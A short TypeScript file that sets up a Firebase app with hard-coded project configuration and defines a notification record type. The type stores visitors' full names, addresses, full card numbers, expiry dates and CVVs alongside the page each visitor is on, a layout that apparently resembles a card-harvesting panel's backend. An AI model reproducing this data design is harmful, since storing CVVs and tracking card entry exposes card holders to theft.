import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyDrR0sWPAaJeNBp8ey3DwVwbFEjQBgyHBE',
  authDomain: 'helprertf.firebaseapp.com',
  projectId: 'helprertf',
  storageBucket: 'helprertf.firebasestorage.app',
  messagingSenderId: '741205283129',
  appId: '1:741205283129:web:fa48f6d3d5e89fa2da58e8',
  measurementId: 'G-P3FNDFMB7X',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
